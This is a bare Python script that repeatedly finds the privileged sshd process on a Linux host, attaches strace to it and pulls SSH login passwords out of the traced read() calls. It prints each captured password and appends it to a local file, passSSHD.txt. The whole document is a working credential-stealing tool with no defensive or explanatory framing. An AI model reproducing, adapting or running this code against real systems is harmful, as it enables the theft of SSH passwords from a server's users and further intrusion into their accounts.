import sys
import os
import re
import time

while True:
    pid=0
    x=os.popen("ps -ef | grep sshd | grep -v grep").read()
    split_x=x.split("\n")
    for i in range (len(split_x)):
        if "[priv]" in split_x[i]:
            split_x1=split_x[i].split(" ")
            for j in range(len(split_x1)):
                if split_x1[j].isnumeric():
                    pid=split_x1[j]
                    break
            break
    if pid != 0:
        print("[+] PID of sshd: "+pid)
        os.popen("strace -p "+pid +" -o strace1.txt").read()
        password=""
        output=list(open("strace1.txt"))
        for line in output: 
            if "read(" in line and "\\f\\0\\0\\0" in line:
                password=line.split("\\")[5].split("\"")[0]
        if password != "":
            if password[1] != "0":
                print("[+] Password: "+password[1:])
            else:
                print("[+] Password: "+password[2:])
        else:
            print("[-] Password not found")
        if password != "":
            file=open("passSSHD.txt", "a")
            if password[1] != "0":
                file.write(password[1:]+"\n")
            else:
                file.write(password[2:]+"\n")
            file.close()
